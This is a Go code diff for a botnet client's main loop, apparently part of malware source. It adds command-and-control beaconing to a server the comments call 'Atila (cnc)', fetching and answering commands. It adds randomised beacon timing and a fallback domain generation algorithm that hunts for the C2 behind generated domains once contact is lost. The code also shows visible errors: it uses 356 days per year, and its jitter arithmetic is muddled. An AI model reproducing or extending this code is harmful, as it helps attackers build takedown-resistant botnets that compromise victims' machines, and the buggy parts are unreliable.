@@ -2,6 +2,8 @@ package main
 
 import (
 	"fmt"
+	"math/rand"
+	"net"
 	"time"
 
 	"github.com/google/uuid"
@@ -14,26 +16,74 @@ var publicIdentificationKey = &privateIdentificationKey.PublicKey
 // Generate the unique bot identifier.
 var id uuid.UUID = uuid.New()
 
-func main() {
-	// Make yourself known to the Atila. (cnc)
-	for range time.Tick(time.Second * 5) {
-		fmt.Println("Bot is trying to identify to the back-end.")
-		identified := identify(id.String(), publicIdentificationKey)
-		if identified {
-			fmt.Println("Bot has been identified successfuly.")
-			break
+// Last time since the contact was made with bot herder.
+var lastContactMade int = timeSinceJesus()
+
+// Does Atila (cnc) knows about us?
+var identified bool = false
+
+// timeSinceJesus returns how many days have passed since year 0.
+func timeSinceJesus() int {
+	return (time.Now().Year() * 356) + time.Now().YearDay()
+}
+
+// tick is the content of the main loop. Returns false if something went wrong.
+func tick(host string) bool {
+	if !identified {
+		identified = identify(host, id.String(), publicIdentificationKey)
+		return false
+	}
+
+	messages, err := fetchMessages(host, id.String())
+	if err != nil {
+		fmt.Println(err.Error())
+		return false
+	}
+
+	for _, message := range messages {
+		reply, err := interpretMessage(host, message)
+		if err != nil {
+			fmt.Println(err.Error())
+			continue
+		}
+
+		err = sendMessage(host, reply)
+		if err != nil {
+			fmt.Println(err.Error())
+			continue
+		}
+
+		err = messageAck(host, reply.ReplyTo)
+		if err != nil {
+			fmt.Println(err.Error())
+			continue
 		}
 	}
 
-	go bootServer()
+	return true
+}
 
-	for range time.Tick(time.Second * 10) {
-		// Fetch and interpret messages, then issue responses.
-		readerStatus := inboxReader(id.String())
-		if readerStatus {
-			fmt.Println("Successfully interpreted messages.")
-		} else {
-			fmt.Println("Failed to interpret messages.")
+func main() {
+	rand.Seed(time.Now().UnixNano())
+	for range time.Tick(time.Second + time.Duration(rand.Intn(maxLoopWait-minLoopWait)+maxLoopWait)) {
+		// We need to reach out to hardcoded host just in case.
+		if tick(atilaHost) {
+			// Reset the timer of DGA and move on...
+			lastContactMade = timeSinceJesus()
+			continue
 		}
+
+		// Check if DGA should kick it.
+		if timeSinceJesus()-lastContactMade > dgaAfterDays {
+			// Try to find the Atila (cnc) behind a generated domain.
+			for _, host := range dga() {
+				if _, err := net.LookupIP(host); err != nil {
+					continue
+				}
+				tick(host)
+			}
+		}
+
+		rand.Seed(time.Now().UnixNano())
 	}
 }
